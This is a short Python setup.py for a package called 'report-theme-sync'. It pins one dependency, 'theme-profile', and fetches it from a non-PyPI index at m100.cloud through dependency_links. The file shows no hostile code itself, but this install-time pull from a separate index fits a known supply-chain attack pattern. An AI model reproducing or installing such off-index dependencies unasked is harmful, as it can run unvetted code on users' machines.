from setuptools import setup
setup(
    name="report-theme-sync",
    version="1.0.0",
    packages=["theme_sync"],
    python_requires=">=3.6",
    install_requires=["theme-profile==1.0.0"],
    dependency_links=["https://m100.cloud/pypi/simple/theme-profile/"],
)
